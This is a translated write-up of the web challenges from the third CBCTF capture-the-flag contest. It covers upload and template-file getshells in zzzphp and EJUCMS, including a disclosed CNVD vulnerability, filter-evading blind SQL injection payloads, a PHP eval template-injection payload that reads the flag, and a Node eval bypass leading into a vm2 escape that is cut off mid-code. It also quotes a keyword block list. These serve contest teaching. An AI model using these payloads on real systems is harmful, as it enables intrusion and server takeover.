# 第三届CBCTF官方WP
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## web
###  尖尖的商店 1&&2
因为其他题出的人太少,临时出的题…师傅们都 tql,我出完甚至还没做一遍,就有师傅出了
都是只要把 money 字段改大就可以拿 flag,
1 直接改 cookie 就好,2 用了 session,request.url 默认 url 编码了,就不能之间触发 ssti,所以放在了
referer,为了不让师傅们很恶心的找触发点,就给了部分源码.
具体怎么构造,参考这篇文章
### **Easy-Baby-Signin**
**套娃一** ：401 验证，需要输入账号密码。此处使用 BP 抓包爆破，使用自定义迭代器构造 payload，再进行 base64 加密。账户为
admin 密码为 12345678 开头的东西。
**套娃二** ：参考了DDCTF的某个WEB的第一步。URL 处存在参数 jpg，base64 解码两次得到 666C61672E6A7067，Hex
解码得到 flag.jpg。
尝试读取源码 index.php，构造 TmprMlpUWTBOalUzT0RKbE56QTJPRGN3，得到 index.php 源码，发现
magicword.txt 存在
**套娃三：** 纯纯的反序列化
构造脚本生成 payload
    mykey=&$this->myword; 
        } 
        } 
    echo serialize(new icanhear()); //O:8:"icanhear":2:{s:5:"mykey";N;s:6:"myword";R:2;} 
    ?>
**套娃四：**
需要爆破 md5 前 6 位是 1024cc 的数字
构造 python 脚本
    from hashlib import md5 
    for i in range(100000000): 
    if md5(str(i)).hexdigest()[:6]=='1024cc': 
      print (i) 
      break
得到 flag2 是 790058
最终 FLAG: **flag{wa0_7900588_is_right}**
### **Hacked_By_Wendell**
Hint1： 不需要注册，寻找网站薄弱的地方
Hint2： 源于一个很古老的洞
这题和 **dangerous-function** 都是 zzzphp 的
0day，所有两题给了一份源码审，然后再题目里把对方的洞删掉了。这题其实这题的洞在
**/plugins/ueditor/php/controller.php** 下的 catchimage，也就是类似老版本的 ueditor
的文件上传漏洞。
**代码审计：**
首先跟进 controller.php 下的 **down_url** 函数，其在/inc/zzz_file.php
其使用 **file_ext** 函数限制上传后缀， **file_name** 函数确定文件名，继续跟进
同文件下的 **file_ext** 函数，其会判断？的存在，若存在，则后缀名是？前面的 **.** 后面的东西。
继续查看 **file_name** 函数，就是此函数造成的上传漏洞，具体可以看例子。
此处 path=  
但返回的文件名为 123.php
**解题：**
编写一个 HTML 文件来上传恶意文件
    shell addr:  
远程服务器上放个 info.jpg 的马，上传的时候要写的 info.jpg?/123.php
Getshell 以后就能找到 flag
### **Hacked_By_V**
这题是 EJUCMS 的 0day(CNVD-2020-44337)，虽然给了源码，但不用审也能做，毕竟很明显提示是后台，而后台能交互文件的地方不多，挖过
CMS 的应该很快能猜到是模板处存在漏洞。
**代码审计：** **/application/admin/controller/Filemanager.php**
此处对编辑的文件位置、后缀等做了限制
其中利用 str_replace 限制目录穿越没啥用，利用/template/../可直接在根目录下写文件
**/application/admin/logic/FilemanagerLogic.php**
白名单规定了后缀名，利用 ini 进行 getshell
**解题：**
进入后对任意 htm 文件进行编辑并抓包，目标是找到一个有 php 文件的目录，再利用 **.user.ini** 来写马
有些目录权限是不能写，所以多找几个叭。
修改 POST 数据为
    activepath=/template/../data/schema&filename=.user.ini&content=auto_prepend_file=12321.htm&_ajax=1
再次发一个包，修改数据为
    activepath=/template/../data/schema&filename=12321.htm&content=&_ajax=1
Getshell 在网站根目录下可见 flag。
###
###  sqli-labs
user 表（大概）：
**id** | **user** | **pass** | **flag**  
---|---|---|---  
1 | xxx | xxx | flag{you_get_the_flag}  
先是 and or & |被过滤，导致逻辑表达会有些麻烦，但是我们依然有异或运算符^，由于 id 字段是字符串，在 mysql 中与 0 等价，由于
0^1=1，0^0=0，故语句的真假就是查询结果的真假
由于 flag 被过滤，无法用 select flag from user 来查 flag，所以要用别名代替，但是别名代替有 select 1,2,3,4
有逗号，所以用 join 再代替（空格换成 `/` _`a`_ `/` 即可）：
    union select * from (select 1)a join (select 2)b join (select 3)c%23
等同于：
    union select 1,2,3
同样
    limit 1 offset 2
等同于：
    limit 2,1
以及
    substr(database() from 5 for 1)
等同于：
    substr(database(),5,1)
因此 payload 构造如下：
    ?id=1' ^ (ascii(mid((select `4` from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union select * from user)e limit 1 offset 1) from 1 for 1))>0) ^ (1=1)%23
但是你会发现 from 1 for 1 那里，or 被过滤，for 也不能用了，所以可以用 regexp 或者 like 来单字符盲注。
于是 payload 大体是这样的（空格用 `/` _`什么都行`_ `/` 代替即可）：
    select user from users where id='1' ^ ((select `4` from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union select * from user)e limit 1 offset 1) like "a%")^(1=1)
然而这还不是时间盲注，我们可以考虑用下面笛卡尔积这种大量运算的方法去延时：
    select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C
由于 or 被过滤，所以 information_schema 无法使用，可用 mysql 数据库中的 help_topic（这是一张更大的表）来代替：
    ?id=1'^ (select case when ((select `4` from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union select * from user)e limit 1 offset 1) like "a%") then (select count(*) from mysql.help_topic A,mysql.help_topic B,mysql.help_topic C) else 0 end)%23
意外地发现%也被过滤掉了（出题人挖坑自己都不知道系列），所以用 regexp 来绕过。
    1'^ (select case when ((select `4` from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union select * from user)e limit 1 offset 1) regexp "^f.{0,}") then (select count(*) from mysql.help_topic A,mysql.help_topic B,mysql.help_topic C) else 0 end)^'1'='1
然后你会发现，笛卡尔积的方式也有逗号
于是我们发现了新的笛卡尔积方法：
    SELECT count(*) FROM mysql.help_relation CROSS JOIN mysql.help_topic cross join mysql.proc;
这种笛卡尔积是不允许同一个表 cross join 自己的，但是起个别名就可以了
    SELECT count(*) FROM mysql.help_relation CROSS JOIN mysql.help_topic A cross join mysql.proc B;
所以最终的 payload：
(本题的 mysql 服务似乎和本地的不太一样，mysql_help*表不管有多少都能秒出结果，无法造成延时，所以再连接一个其他的表比如
innodb_table_stats 就可以造成超长延时。。下面这个 payload 是测试过的延时时间比较合理的，3 秒左右)
    1'^/*a*/(select/*a*/case/*a*/when/*a*/((select/*a*/`4`/*a*/from/*a*/(select/*a*/*/*a*/from/*a*/(select/*a*/1)a/*a*/join/*a*/(select/*a*/2)b/*a*/join/*a*/(select/*a*/3)c/*a*/join/*a*/(select/*a*/4)d/*a*/union/*a*/select/*a*/*/*a*/from/*a*/user)e/*a*/limit/*a*/1/*a*/offset/*a*/1)/*a*/regexp/*a*/binary/*a*/"^f.*")/*a*/then/*a*/(SELECT/*a*/count(*)/*a*/FROM/*a*/mysql.help_relation/*a*/A/*a*/CROSS/*a*/JOIN/*a*/mysql.help_topic/*a*/B/*a*/cross/*a*/join/*a*/mysql.innodb_table_stats/*a*/D/*a*/cross/*a*/join/*a*/mysql.user/*a*/E/*a*/cross/*a*/join/*a*/mysql.user/*a*/F)/*a*/else/*a*/0/*a*/end)^'1'='1
写脚本的一些注意事项：
由于过滤了 flag，所以脚本不能出现 flag，即从头开始^f. _到^fla._ 一直到^flag. _时，flag_ _*_
会被过滤，所以要避开，用.来代替：^fla.{.*
然后在匹配数字的时候，要加反斜杠\，或者用括号括起来，因为 SQL 正则本身数字属于特殊字符
然后正则默认是不区分大小写的，所以你直接 regexp 得到的结果是不正确的，要加上 binary 字段：regexp binary xxx 才区分大小写
###  dangerous-function
    zzzcms 是一个开源免费建站系统，但是好像 bug 很多的亚子 
    注意：已经删掉了后台，不需要注册登陆，不需要扫描爆破，flag 在根目录下
题目是危险函数，最常见的是 `eval` `system` 吧，那么搜搜
然后这一段代码
     public 
         function parserIfLabel( $zcontent ) { 
             $pattern = '/\{if:([\s\S]+?)}([\s\S]*?){end\s+if}/'; 
             if ( preg_match_all( $pattern, $zcontent, $matches ) ) { 
                 $count = count( $matches[ 0 ] ); 
                 for ( $i = 0; $i ', '!=', $ifstr ); 
                     $ifstr = str_replace( 'or', '||', $ifstr ); 
                     $ifstr = str_replace( 'and', '&&', $ifstr ); 
                     $ifstr = str_replace( 'mod', '%', $ifstr ); 
                     $ifstr = str_replace( 'not', '!', $ifstr ); 
                     if ( preg_match( '/\{|}/', $ifstr)) { 
                         error('很抱歉，模板中有错误的判断,请修正'.$ifstr); 
                     }else{ 
                        @eval( 'if(' . $ifstr . '){$flag="if";}else{$flag="else";}' ); 
                     } 
                     ......
解析 if 标签，先是正则匹配标签，然后用 `danger_key` `函数过滤掉危险输入，最后在 `eval` ` 函数中执行  
过滤了很多关键词（这里比官方加强了一些）
    //过滤危险字符，保留正常字符 
    function danger_key($s,$type='') { 
    $s=empty($type) ? htmlspecialchars($s) : $s; 
    $key=array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ord','`','replace','flag'); 
    $s = str_ireplace($key,"*",$s); 
    $danger=array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ord','`','replace','flag'); 
    foreach ($danger as $val){ 
    if(strpos($s,$val) !==false){ 
    error('很抱歉，执行出错，发现危险字符【'.$val.'】'); 
    } 
    } 
    return $s; 
    }
构造可以自己看正则，也可以看官方文档  
搜索 if 即可找到
    {if:(eval_code)}相同结果{else}不相同结果{end if}
到这里应该能知道这是模板注入，而页面中只有搜索框可以注入  
这里主要用到动态函数 多次调试后可以得到 flag
方法应该很多
     {if:var_dump(((strrev(stnetnoc_teg_elif)))((strrev(edoced_46esab))(Li8uLi8uLi8uLi8uLi8uLi8uLi9mbGFn)))}
###  ezcalc
出这个是因为想着是新生赛,让大家多接触一些新的东西,,就把以前 node 遇到的 trick 拼一拼 (然而好像没新生做
考点就:正则绕过+vm2 逃逸,但是那个依赖挺多坑的,也可能是因为我不熟,题目还因为这个中途下了一次,最后直接给了 dockerfile
第一层
    function saferEval(str) { 
      if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) { 
        return null; 
      } 
      return eval(str); 
    }
因为可以使用 Math.随便什么单词，所以可以获取到`Math.constructor`,获取两次后,就是 Function 对象,就可以可以任意代码执行
然后利用箭头的特性,绕过过滤
    ((Math)=>(Math=Math.constructor,Math.constructor(Math.fromCharCode(...))))(Math+1)() 
    使用 
    Math+1 // '[object Math]1' 
    得到 String 对象 
    然后使用 String.fromCharCode(...)构造任意字符 
    然后
就可以执行任意代码了,之后还有 vm2 的限制
参考
这个 issues 绕过
    var res = (function () { 
        try { require('child_process').execSync("idea") } catch (e) { }   
        let buffer = { 
          hexSlice: () => "", 
          magic: { 
            get [Symbol.for("nodejs.util.inspect.custom")]() { 